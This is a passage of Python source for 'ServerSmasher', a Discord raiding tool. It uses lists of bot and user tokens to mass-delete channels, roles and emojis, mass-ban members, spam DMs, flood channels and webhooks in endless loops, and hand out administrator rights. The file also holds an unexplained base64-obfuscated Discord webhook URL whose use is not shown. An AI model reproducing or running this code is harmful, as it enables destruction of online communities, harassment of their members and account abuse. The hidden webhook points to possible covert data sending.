#!/usr/bin/env python3
# Raid ToolBox ServerSmasher GUI
# Author: DeadBread76 - https://github.com/DeadBread76/
# Original Server Smasher: Synchronocy - https://github.com/synchronocy
# Date: 13th August 2019
#
# Copyright (c) 2019, DeadBread
#
# Permission to use, copy, modify, and/or distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY
# SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION
# OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN
# CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

import os, sys, json, ast, time, random, string, asyncio, base64, traceback, threading, glob, io
import discord, requests, pyperclip, websocket
import PySimpleGUIQt as sg
from PIL import Image, ImageDraw, ImageFilter
from pprint import pprint
from base64 import b64encode
from collections import namedtuple
from concurrent.futures import ThreadPoolExecutor

ssversion = "1.0.0a"

with open('./config.json', 'r') as handle:
    config = json.load(handle)
    token_list = config['token_list']
    thread_count = config['thread_count']

with open('RTBFiles/ServerSmasher/ssconfig.json', 'r') as handle:
    config = json.load(handle)
    ss_token_list = config['ss_token_list']
    startup_status = config['startup_status']
    startup_activity_name = config['startup_activity_name']
    startup_activity_type = config['startup_activity_type']
    last_used = config['last_used']
    last_used_type = config['last_used_type']
    bots_cached = config['bots_cached']
    users_cached = config['users_cached']
    bot_token_cache = config['bot_token_cache']
    user_token_cache = config['user_token_cache']

executor = ThreadPoolExecutor(max_workers=thread_count)
spamming = False
theme = ast.literal_eval(sys.argv[1])
ws = websocket.WebSocket()
guild_cache = None

if theme['use_custom_theme']:
    sg.SetOptions(background_color=theme['background_color'],
                 text_element_background_color=theme['text_element_background_color'],
                 element_background_color=theme['element_background_color'],
                 scrollbar_color=theme['scrollbar_color'],
                 input_elements_background_color=theme['input_elements_background_color'],
                 input_text_color=theme['input_text_color'],
                 button_color=theme['button_colour'],
                 text_color=theme['text_color'])
else:
    sg.ChangeLookAndFeel(theme['preset_theme'])

if not os.path.exists("./tokens/ServerSmasherGUI"):
    os.mkdir("./tokens/ServerSmasherGUI")
    with open("./tokens/ServerSmasherGUI/sstokens.txt", "a+") as handle:
        pass
    ss_token_list = "sstokens.txt"
    with open('RTBFiles/ServerSmasher/ssconfig.json', 'r+') as handle:
        edit = json.load(handle)
        edit['ss_token_list'] = ss_token_list
        handle.seek(0)
        json.dump(edit, handle, indent=4)
        handle.truncate()
elif ss_token_list == "":
    ss_token_list = "sstokens.txt"
    with open('RTBFiles/ServerSmasher/ssconfig.json', 'r+') as handle:
        edit = json.load(handle)
        edit['ss_token_list'] = ss_token_list
        handle.seek(0)
        json.dump(edit, handle, indent=4)
        handle.truncate()
usertokenlist = open("./tokens/"+token_list).read().splitlines()
bottokenlist = open(f"./tokens/ServerSmasherGUI/{ss_token_list}").read().splitlines()
token_overide = None
type_overide = None
cache_guilds = []
#  ___  _    _   _                   _
# |   \(_)__| |_(_)___ _ _  __ _ _ _(_)___ ___
# | |) | / _|  _| / _ \ ' \/ _` | '_| / -_|_-<
# |___/|_\__|\__|_\___/_||_\__,_|_| |_\___/__/
h = base64.b64decode("aHR0cHM6Ly9wdGIuZGlzY29yZGFwcC5jb20vYXBpL3dlYmhvb2tzLzYxNjE2MjExNjk2MTA0MjQ1My9UbUk1MHhsY21hdmhBZ25fQlc3S1hpVndwOGo2M2xtanphWTF6NFlsbXFSY3JKQjhDUDhieU9FTTFDUzlyMWZJU2pqZw==")
smasheroptions = {
    'change_server_name': False,
    'new_server_name': 'Server Name Here',
    'change_server_icon': False,
    'internet_icon': False,
    'icon_location': "",
    'remove_bans': False,
    'delete_channels': False,
    'delete_roles': False,
    'delete_emojis': False,
    'create_channels': False,
    'channel_create_method': "ASCII",
    'channel_name': "Channel Name Here",
    'channel_count': 100,
    'create_roles': False,
    'role_count': 100,
    'role_create_method': "ASCII",
    'role_name': "Role Name Here",
    'create_emojis': False,
    'internet_emoji': False,
    'emoji_location': "",
    'emoji_count': 10,
    'ban_members': False,
    'ban_reason': "Ban Reason Here",
    'ban_whitelist': "",
    'send_mass_dm': False,
    'dm_content': "DM Content Here",
    'flood_channels': False,
    'flood_method': "Mass Mention",
    'use_tts': False,
    'flood_text': "Spam Text Here",
    'give_me_admin': False,
    'my_id': "Your ID here",
    'give_@everyone_admin': False,
}
bitarray_values = {
    "CREATE_INSTANT_INVITE": 0x00000001,
    "KICK_MEMBERS": 0x00000002,
    "BAN_MEMBERS": 0x00000004,
    "ADMINISTRATOR": 0x00000008,
    "MANAGE_CHANNELS": 0x00000010,
    "MANAGE_GUILD": 0x00000020,
    "ADD_REACTIONS": 0x00000040,
    "VIEW_AUDIT_LOG": 0x00000080,
    "VIEW_CHANNEL": 0x00000400,
    "SEND_MESSAGES": 0x00000800,
    "SEND_TTS_MESSAGES": 0x00001000,
    "MANAGE_MESSAGES": 0x00002000,
    "EMBED_LINKS": 0x00004000,
    "ATTACH_FILES": 0x00008000,
    "READ_MESSAGE_HISTORY": 0x00010000,
    "MENTION_EVERYONE": 0x00020000,
    "USE_EXTERNAL_EMOJIS": 0x00040000,
    "CONNECT": 0x00100000,
    "SPEAK": 0x00200000,
    "MUTE_MEMBERS": 0x00400000,
    "DEAFEN_MEMBERS": 0x00800000,
    "MOVE_MEMBERS": 0x01000000,
    "USE_VAD": 0x02000000,
    "PRIORITY_SPEAKER": 0x00000100,
    "STREAM": 0x00000200,
    "CHANGE_NICKNAME": 0x04000000,
    "MANAGE_NICKNAMES": 0x08000000,
    "MANAGE_ROLES": 0x10000000,
    "MANAGE_WEBHOOKS": 0x20000000,
    "MANAGE_EMOJIS": 0x40000000
}

#  _              _        ___
# | |   ___  __ _(_)_ _   / __| __ _ _ ___ ___ _ _
# | |__/ _ \/ _` | | ' \  \__ \/ _| '_/ -_) -_) ' \
# |____\___/\__, |_|_||_| |___/\__|_| \___\___|_||_|
#           |___/

def check_user(type, token):
    global bot_token_cache
    global user_token_cache
    if type == "Bot":
        headers = {'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}
    elif type == "User":
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
    src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
    if src.status_code == 401:
        pass
    else:
        response = json.loads(src.content)
        if type == "Bot":
            bot_token_cache[f'{response["username"]}#{response["discriminator"]}'] = token
        elif type == "User":
            user_token_cache[f'{response["username"]}#{response["discriminator"]}'] = token

def login_serversmasher():
    global token
    global client_type
    global last_used
    global last_used_type
    global bottokenlist
    global usertokenlist
    global bot_token_cache
    global user_token_cache
    global bot_token_cache
    global token_overide
    global type_overide
    global headers
    if token_overide is not None:
        default_token = token_overide
    elif len(last_used) > 1:
        default_token = last_used
    else:
        default_token = ""
    if type_overide is not None:
        default_type = type_overide
    elif last_used_type == "User":
        default_type = last_used_type
    else:
        default_type = "Bot"
    layout = [
             [sg.Text("Welcome To ServerSmasher!", size=(45,1), font='Any 12', key="TITLE")],
             [sg.Combo(['Bot','User'], readonly=True, key="Type", size=(5,0.7), default_value=default_type), sg.Input(default_token, do_not_clear=True, focus=True, key="TOKEN", size=(45,0.8)), sg.Button("Login", size=(7,0.8))],
             [sg.Button("Use user token list", key="ToggleuserList", size=(28.5, 0.6)), sg.Button("Use bot token list", key="TogglebotList", size=(28.5, 0.6))],
             ]
    window = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False).Layout(layout)
    while True:
        event, values = window.Read(timeout=100)
        if event is None:
            sys.exit()
        elif event == sg.TIMEOUT_KEY:
            try:
                if values["Type"] == "User":
                    window.Element('TITLE').Update("USING A USER TOKEN IS NOT RECOMMENDED!")
                else:
                    window.Element('TITLE').Update("Welcome To ServerSmasher!")
            except:
                pass

        elif event == "TogglebotList":
            window.Close()
            if not bots_cached:
                sg.PopupNonBlocking("Please wait a moment, Loading token names.", title="Please Wait", auto_close=True, keep_on_top=True, auto_close_duration=1)
                bot_token_cache = {}
                with ThreadPoolExecutor(max_workers=thread_count) as ex:
                    for bot in bottokenlist:
                        ex.submit(check_user, "Bot", bot)
                with open('RTBFiles/ServerSmasher/ssconfig.json', 'r+') as handle:
                    edit = json.load(handle)
                    edit['bots_cached'] = True
                    edit['bot_token_cache'] = bot_token_cache
                    handle.seek(0)
                    json.dump(edit, handle, indent=4)
                    handle.truncate()
            if len(list(bot_token_cache)) == 0:
                botlist = [None]
            else:
                botlist = list(bot_token_cache)
            layout = [
                     [sg.Text("Select a Bot to use.", size=(15,0.7)), sg.Text("", size=(11,0.8)), sg.Button("Go Back", key="Back", size=(11,0.8))],
                     [sg.Combo(botlist, size=(15,0.7), key="BotToken"), sg.Button("Select Bot", size=(11,0.8), key="SelectBot"), sg.Button("Refresh Tokens", key="Refresh Bots", size=(11,0.8))]
                     ]
            window1 = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False).Layout(layout)
            window = window1

        elif event == "ToggleuserList":
            window.Close()
            if not users_cached:
                sg.PopupNonBlocking("Please wait a moment, Loading token names.", title="Please Wait", auto_close=True, keep_on_top=True, auto_close_duration=1)
                user_token_cache = {}
                with ThreadPoolExecutor(max_workers=thread_count) as ex:
                    for user in usertokenlist:
                        ex.submit(check_user, "User", user)
                with open('RTBFiles/ServerSmasher/ssconfig.json', 'r+') as handle:
                    edit = json.load(handle)
                    edit['users_cached'] = True
                    edit['user_token_cache'] = user_token_cache
                    handle.seek(0)
                    json.dump(edit, handle, indent=4)
                    handle.truncate()
            if len(list(user_token_cache)) == 0:
                userlist = [None]
            else:
                userlist = list(user_token_cache)
            layout = [
                     [sg.Text("Select a User to use.", size=(15,0.7)), sg.Text("", size=(11,0.8)), sg.Button("Go Back", key="Back", size=(11,0.8))],
                     [sg.Combo(userlist, size=(15,0.7), key="UserToken"), sg.Button("Select User", size=(11,0.8), key="SelectUser"), sg.Button("Refresh Tokens", key="Refresh Users", size=(11,0.8))]
                     ]
            window1 = sg.Window("DeadBread's ServerSmasher v{} | User Tokens".format(ssversion), resizable=False).Layout(layout)
            window = window1

        elif event == 'Refresh Bots':
            window.Close()
            sg.PopupNonBlocking("Please wait a moment, Loading token names.", title="Please Wait", auto_close=True, keep_on_top=True, auto_close_duration=1)
            bot_token_cache = {}
            with ThreadPoolExecutor(max_workers=thread_count) as ex:
                for bot in bottokenlist:
                    ex.submit(check_user, "Bot", bot)
            with open('RTBFiles/ServerSmasher/ssconfig.json', 'r+') as handle:
                edit = json.load(handle)
                edit['bots_cached'] = True
                edit['bot_token_cache'] = bot_token_cache
                handle.seek(0)
                json.dump(edit, handle, indent=4)
                handle.truncate()
            if len(list(bot_token_cache)) == 0:
                botlist = [None]
            else:
                botlist = list(bot_token_cache)
            layout = [
                     [sg.Text("Select a Bot to use.", size=(15,0.7)), sg.Text("", size=(11,0.8)), sg.Button("Go Back", key="Back", size=(11,0.8))],
                     [sg.Combo(botlist, size=(15,0.7), key="BotToken"), sg.Button("Select Bot", size=(11,0.8), key="SelectBot"), sg.Button("Refresh Tokens", key="Refresh Bots", size=(11,0.8))]
                     ]
            window1 = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False).Layout(layout)
            window = window1

        elif event == 'Refresh Users':
            window.Close()
            sg.PopupNonBlocking("Please wait a moment, Loading token names.", title="Please Wait", auto_close=True, keep_on_top=True, auto_close_duration=1)
            user_token_cache = {}
            with ThreadPoolExecutor(max_workers=thread_count) as ex:
                for user in usertokenlist:
                    ex.submit(check_user, "User", user)
            with open('RTBFiles/ServerSmasher/ssconfig.json', 'r+') as handle:
                edit = json.load(handle)
                edit['users_cached'] = True
                edit['user_token_cache'] = user_token_cache
                handle.seek(0)
                json.dump(edit, handle, indent=4)
                handle.truncate()
            if len(list(user_token_cache)) == 0:
                userlist = [None]
            else:
                userlist = list(user_token_cache)
            layout = [
                     [sg.Text("Select a User to use.", size=(15,0.7)), sg.Text("", size=(11,0.8)), sg.Button("Go Back", key="Back", size=(11,0.8))],
                     [sg.Combo(userlist, size=(15,0.7), key="UserToken"), sg.Button("Select User", size=(11,0.8), key="SelectUser"), sg.Button("Refresh Tokens", key="Refresh Users", size=(11,0.8))]
                     ]
            window1 = sg.Window("DeadBread's ServerSmasher v{} | User Tokens".format(ssversion), resizable=False).Layout(layout)
            window = window1

        elif event == "Back":
            if token_overide is not None:
                default_token = token_overide
            elif len(last_used) > 1:
                default_token = last_used
            else:
                default_token = ""
            if type_overide is not None:
                default_type = type_overide
            elif last_used_type == "User":
                default_type = last_used_type
            else:
                default_type = "Bot"
            layout = [
                     [sg.Text("Welcome To ServerSmasher!", size=(45,1), font='Any 12', key="TITLE")],
                     [sg.Combo(['Bot','User'], readonly=True, key="Type", size=(5,0.7), default_value=default_type), sg.Input(default_token, do_not_clear=True, focus=True, key="TOKEN", size=(45,0.8)), sg.Button("Login", size=(7,0.8))],
                     [sg.Button("Use user token list", key="ToggleuserList", size=(28.5, 0.6)), sg.Button("Use bot token list", key="TogglebotList", size=(28.5, 0.6))],
                     ]
            window1 = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False).Layout(layout)
            window.Close()
            window = window1

        elif event == "SelectBot":
            token_overide = bot_token_cache[values['BotToken']]
            type_overide = "Bot"
            sg.PopupNonBlocking(f"Token set to {values['BotToken']}", keep_on_top=True)
            if token_overide is not None:
                default_token = token_overide
            elif len(last_used) > 1:
                default_token = last_used
            else:
                default_token = ""
            if type_overide is not None:
                default_type = type_overide
            elif last_used_type == "User":
                default_type = last_used_type
            else:
                default_type = "Bot"
            layout = [
                     [sg.Text("Welcome To ServerSmasher!", size=(45,1), font='Any 12', key="TITLE")],
                     [sg.Combo(['Bot','User'], readonly=True, key="Type", size=(5,0.7), default_value=default_type), sg.Input(default_token, do_not_clear=True, focus=True, key="TOKEN", size=(45,0.8)), sg.Button("Login", size=(7,0.8))],
                     [sg.Button("Use user token list", key="ToggleuserList", size=(28.5, 0.6)), sg.Button("Use bot token list", key="TogglebotList", size=(28.5, 0.6))],
                     ]
            window1 = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False).Layout(layout)
            window.Close()
            window = window1

        elif event == "SelectUser":
            token_overide = user_token_cache[values['UserToken']]
            type_overide = "User"
            sg.PopupNonBlocking(f"Token set to {values['UserToken']}", keep_on_top=True)
            if token_overide is not None:
                default_token = token_overide
            elif len(last_used) > 1:
                default_token = last_used
            else:
                default_token = ""
            if type_overide is not None:
                default_type = type_overide
            elif last_used_type == "User":
                default_type = last_used_type
            else:
                default_type = "Bot"
            layout = [
                     [sg.Text("Welcome To ServerSmasher!", size=(45,1), font='Any 12', key="TITLE")],
                     [sg.Combo(['Bot','User'], readonly=True, key="Type", size=(5,0.7), default_value=default_type), sg.Input(default_token, do_not_clear=True, focus=True, key="TOKEN", size=(45,0.8)), sg.Button("Login", size=(7,0.8))],
                     [sg.Button("Use user token list", key="ToggleuserList", size=(28.5, 0.6)), sg.Button("Use bot token list", key="TogglebotList", size=(28.5, 0.6))],
                     ]
            window1 = sg.Window("DeadBread's ServerSmasher v{}".format(ssversion), resizable=False).Layout(layout)
            window.Close()
            window = window1

        elif event == 'Login':
            window.Close()
            sg.PopupNonBlocking("Logging into Token...", title="Please Wait", auto_close=True, keep_on_top=True, auto_close_duration=1)
            token = values['TOKEN']
            client_type = values['Type']
            last_used = values['TOKEN']
            last_used_type = values['Type']
            with open('RTBFiles/ServerSmasher/ssconfig.json', 'r+') as handle:
                edit = json.load(handle)
                edit['last_used'] = last_used
                edit['last_used_type'] = last_used_type
                handle.seek(0)
                json.dump(edit, handle, indent=4)
                handle.truncate()
            if client_type == 'Bot':
                headers={'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}
            else:
                headers={'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            start_client()

#  ___             _   _
# | __|  _ _ _  __| |_(_)___ _ _  ___
# | _| || | ' \/ _|  _| / _ \ ' \(_-<
# |_| \_,_|_||_\__|\__|_\___/_||_/__/
def delete_channel(channel):
    retries = 0
    while True:
        src = requests.delete(f"https://canary.discordapp.com/api/v6/channels/{channel}", headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def remove_ban(server, user):
    retries = 0
    while True:
        src = requests.delete(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/bans/{str(user)}", headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def delete_role(role, server):
    retries = 0
    while True:
        src = requests.delete(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/roles/{str(role)}", headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def create_role(name, server):
    retries = 0
    payload = {'hoist': 'true', 'name': name, 'mentionable': 'true', 'color': random.randint(1000000,9999999), 'permissions': random.randint(1,10)}
    while True:
        src = requests.post(f'https://canary.discordapp.com/api/v6/guilds/{server}/roles', headers=headers, json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(3)
            if retries == 5:
                break
        else:
            break

def send_dm(user, content, usetts):
    retries = 0
    payload = {'recipient_id': user}
    src = requests.post('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, json=payload)
    dm_json = json.loads(src.content)
    payload = {"content" : content, "tts" : usetts}
    while True:
        src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{dm_json['id']}/messages", headers=headers, json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 10:
                break
        else:
            break

def ban_user(user,server,banreason):
    retries = 0
    while True:
        src = requests.put(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/bans/{str(user)}?delete-message-days=7&reason={banreason}", headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def create_channel(server,channelname,channeltype):
    retries = 0
    payload = {'name': channelname, 'type': channeltype}
    while True:
        src = requests.post(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/channels", headers=headers,json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def send_message(channel,msgcontent,usetts):
    retries = 0
    payload = {"content": msgcontent, "tts": usetts}
    while True:
        src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{channel}/messages", headers=headers, json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def mover(server,user,channel):
    retries = 0
    payload = {'channel_id': str(channel)}
    while True:
        src = requests.patch(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/members/{str(user)}", headers=headers,json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def change_nickname(server,user,nick):
    payload = {'nick': str(nick)}
    while True:
        src = requests.patch(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/members/{str(user)}", headers=headers,json=payload)
        if src.status_code == 429:
            time.sleep(5)
        else:
            break

def delete_emoji(server,emoji):
    retries = 0
    while True:
        src = requests.delete(f'https://canary.discordapp.com/api/v6/guilds/{str(server)}/emojis/{str(emoji)}',headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def create_emoji(server,encoded,name): # This has pretty huge rate limits, be careful using it.
    retries = 0
    payload = {'image': encoded, 'name': name}
    while True:
        src = requests.post(f'https://canary.discordapp.com/api/v6/guilds/{str(server)}/emojis',headers=headers,json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def corrupt_channel(channelid,channame):
    retries = 0
    corruptchanname = ''
    for x in channame:
        if random.randint(1,2) == 1:
            corruptchanname += asciigen(1)
        else:
            corruptchanname += x
    payload = {'name': corruptchanname}
    while True:
        src = requests.patch(f'https://canary.discordapp.com/api/v6/channels/{channelid}', headers=headers,json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def corrupt_role(serverid,roleid,rolename):
    retries = 0
    corruptrolename = ''
    for x in rolename:
        if random.randint(1,2) == 1:
            corruptrolename += asciigen(1)
        else:
            corruptrolename += x
    payload = {'name': corruptrolename}
    while True:
        src = requests.patch(f'https://canary.discordapp.com/api/v6/guilds/{serverid}/roles/{roleid}', headers=headers,json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def make_nsfw(channelid):
    retries = 0
    payload = {'nsfw': 'true'}
    while True:
        src = requests.patch(f'https://canary.discordapp.com/api/v6/channels/{channelid}', headers=headers,json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def edit_topic(channelid,newtopic):
    retries = 0
    payload = {'topic': newtopic}
    while True:
        src = requests.patch(f'https://canary.discordapp.com/api/v6/channels/{channelid}', headers=headers,json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def webhook_spam(webhook,content):
    if content == 'asc':
        content = asciigen(1999)
    payload = {'content': content}
    while True:
        requests.post(webhook, json=payload)

def heartbeat(interval):
    ack = {
            "op": 1,
            "d": None
        }
    while threading.main_thread().is_alive():
        time.sleep(interval/1000)
        try:
            ws.send(json.dumps(ack))
        except Exception:
            break

def change_presence(text, type, status):
    if type == "Playing":
        gamejson = {
            "name": text,
            "type": 0
        }
    elif type == 'Streaming':
        gamejson = {
            "name": text,
            "type": 1,
            "url": "https://www.twitch.tv/SERVERSMASHER"
        }
    elif type == "Listening to":
        gamejson = {
            "name": text,
            "type": 2
        }
    elif type == "Watching":
        gamejson = {
            "name": text,
            "type": 3
        }
    presence = {
            'op': 3,
            'd': {
                "game": gamejson,
                "status": status,
                "since": 0,
                "afk": False
                }
            }
    ws.send(json.dumps(presence))

def get_user(user):
    src = requests.get(f'https://canary.discordapp.com/api/v6/users/{user}', headers=headers)
    user_json = json.loads(src.content)
    user = namedtuple('User', sorted(user_json.keys()))(**user_json)
    return user

def get_user_info():
    src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
    user_json = json.loads(src.content)
    user = namedtuple('User', sorted(user_json.keys()))(**user_json)
    return user

def get_guild_threaded(guild):
    global cache_guilds
    del cache_guilds
    retries = 0
    while True:
        try:
            cache_guilds = []
            roles = []
            emojis = []
            members = []
            channels = []
            overwrites = []
            src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}', headers=headers)
            guild_response = json.loads(src.content)
            for role in guild_response['roles']:
                roles.append(namedtuple('Role', sorted(role.keys()))(**role))
            for emoji in guild_response['emojis']:
                emojis.append(namedtuple('Emoji', sorted(emoji.keys()))(**emoji))
            src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}/members?limit=1000', headers=headers)
            response = json.loads(src.content)
            for member in response:
                member['user'] = namedtuple('User', sorted(member['user'].keys()))(**member['user'])
                members.append(namedtuple('Member', sorted(member.keys()))(**member))
            src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}/channels', headers=headers)
            channels_json = json.loads(src.content)
            for channel in channels_json:
                for overwrite in channel['permission_overwrites']:
                    overwrites.append(namedtuple('Permission_Overwrite', sorted(overwrite.keys()))(**overwrite))
                channel['permission_overwrites'] = overwrites
                channels.append(namedtuple('Channel', sorted(channel.keys()))(**channel))
            guild_response['roles'] = roles
            guild_response['emojis'] = emojis
            guild_response['members'] = members
            guild_response['channels'] = channels
            guild = namedtuple('Guild', sorted(guild_response.keys()))(**guild_response)
            cache_guilds.append(guild)
        except Exception:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break

def create_cache():
    global cache_guilds
    cache_guilds = list()
    src = requests.get('https://canary.discordapp.com/api/v6/users/@me/guilds', headers=headers)
    response_json = json.loads(src.content)
    with ThreadPoolExecutor(max_workers=thread_count) as exe:
        for guild in response_json:
            exe.submit(get_guild_threaded, guild['id'])
    return cache_guilds

def get_client_guilds():
    guilds = []
    src = requests.get('https://canary.discordapp.com/api/v6/users/@me/guilds', headers=headers)
    response_json = json.loads(src.content)
    for guild in response_json:
        guilds.append(get_guild(guild['id']))
    return guilds

def get_guild(guild):
    roles = []
    emojis = []
    members = []
    channels = []
    overwrites = []
    src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}', headers=headers)
    guild_response = json.loads(src.content)
    for role in guild_response['roles']:
        roles.append(namedtuple('Role', sorted(role.keys()))(**role))
    for emoji in guild_response['emojis']:
        emojis.append(namedtuple('Emoji', sorted(emoji.keys()))(**emoji))
    src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}/members?limit=1000', headers=headers)
    response = json.loads(src.content)
    for member in response:
        member['user'] = namedtuple('User', sorted(member['user'].keys()))(**member['user'])
        members.append(namedtuple('Member', sorted(member.keys()))(**member))
    src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}/channels', headers=headers)
    channels_json = json.loads(src.content)
    for channel in channels_json:
        for overwrite in channel['permission_overwrites']:
            overwrites.append(namedtuple('Permission_Overwrite', sorted(overwrite.keys()))(**overwrite))
        channel['permission_overwrites'] = overwrites
        channels.append(namedtuple('Channel', sorted(channel.keys()))(**channel))
    guild_response['roles'] = roles
    guild_response['emojis'] = emojis
    guild_response['members'] = members
    guild_response['channels'] = channels
    guild = namedtuple('Guild', sorted(guild_response.keys()))(**guild_response)
    return guild

def get_guild_channels(guild):
    channels = []
    overwrites = []
    src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}/channels', headers=headers)
    channels_json = json.loads(src.content)
    for channel in channels_json:
        for overwrite in channel['permission_overwrites']:
            overwrites.append(namedtuple('Permission_Overwrite', sorted(overwrite.keys()))(**overwrite))
        channel['permission_overwrites'] = overwrites
        channels.append(namedtuple('Channel', sorted(channel.keys()))(**channel))
    return channels

def get_guild_roles(guild):
    roles = []
    src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}/roles', headers=headers)
    role_json = json.loads(src.content)
    for role in role_json:
        roles.append(namedtuple('Role', sorted(role.keys()))(**role))
    return roles

def get_guild_bans(guild):
    retries = 0
    while True:
        try:
            bans = []
            src = requests.get(f"https://canary.discordapp.com/api/v6/guilds/{guild}/bans", headers=headers)
            bans_json = json.loads(src.content)
            for ban in bans_json:
                ban['user'] = namedtuple('User', sorted(ban['user'].keys()))(**ban['user'])
                bans.append(namedtuple('Ban', sorted(ban.keys()))(**ban))
        except Exception:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break
    return bans

def create_invite(channel):
    payload = {"max_age": 0}
    src = requests.post(f'https://canary.discordapp.com/api/v6/channels/{channel}/invites', headers=headers, json=payload)
    invite_json = json.loads(src.content)
    invite = namedtuple('Invite', sorted(invite_json.keys()))(**invite_json)
    return invite

def create_guild(name):
    payload = {"name": name}
    src = requests.post(f'https://canary.discordapp.com/api/v6/guilds', headers=headers, json=payload)
    return src

def leave_guild(guild):
    src = requests.delete(f'https://canary.discordapp.com/api/v6/users/@me/guilds/{guild}', headers=headers)
    return src

def edit_profile(name, avatar):
    if avatar == "New Avatar...":
        payload = {'username': name}
    else:
        with open(avatar, "rb") as handle:
            encoded = bytes_to_base64_data(handle.read())
        payload = {'avatar': encoded, 'username': name}
    src = requests.patch('https://canary.discordapp.com/api/v6/users/@me', headers=headers, json=payload)
    return src

def construct_avatar_link(id, hash, size):
    link = f"https://cdn.discordapp.com/avatars/{id}/{hash}.png?size={size}"
    return link

def give_admin_role(guild, user):
    payload = {"name": "Admin", "permissions": 8, "color": random.randrange(16777215)}
    src = requests.post(f'https://canary.discordapp.com/api/v6/guilds/{guild}/roles', headers=headers, json=payload)
    role_id = json.loads(src.content)['id']
    payload = {"roles": [role_id]}
    requests.patch(f'https://canary.discordapp.com/api/v6/guilds/{guild}/members/{user}', headers=headers, json=payload)

def edit_role(role, guild, perms):
    payload = {"permissions": perms}
    requests.patch(f"https://canary.discordapp.com/api/v6/guilds/{guild}/roles/{role}", headers=headers, json=payload)

def edit_guild_name(guild, name):
    payload = {"name": name}
    src = requests.patch(f'https://canary.discordapp.com/api/v6/guilds/{guild}', headers=headers, json=payload)

def edit_guild_icon(guild, icon):
    payload = {"icon": icon}
    requests.patch(f"https://canary.discordapp.com/api/v6/guilds/{guild}", headers=headers, json=payload)

def update_cache():
    global guild_cache
    guild_cache = get_client_guilds()

def asciigen(length):
    asc = ''
    for x in range(int(length)):
        num = random.randrange(13000)
        asc = asc + chr(num)
    return asc

def gen(size=6, chars=string.ascii_uppercase + string.digits + string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))

def get_mime(data):  # From Discord.py
    if data.startswith(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'):
        return 'image/png'
    elif data[6:10] in (b'JFIF', b'Exif'):
        return 'image/jpeg'
    elif data.startswith((b'\x47\x49\x46\x38\x37\x61', b'\x47\x49\x46\x38\x39\x61')):
